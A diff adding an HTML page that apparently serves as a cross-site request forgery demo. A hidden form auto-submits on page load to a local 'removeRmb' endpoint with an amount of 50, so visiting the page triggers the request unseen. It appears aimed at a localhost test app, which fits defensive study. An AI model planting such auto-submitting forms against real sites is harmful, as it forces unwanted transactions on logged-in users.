@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Title</title>
+</head>
+<body>
+    <style type="text/css">
+        form {
+            display: none;
+        }
+    </style>
+    <form action="http://localhost:8080/ssm-scaffold/safe/removeRmb">
+        <input name="rmb" type="text" value="50"/>
+        <input id="btn" type="submit"/>
+    </form>
+
+<script>
+    window.onload = function() {
+        document.getElementById("btn").click();
+    }
+</script>
+</body>
+</html>
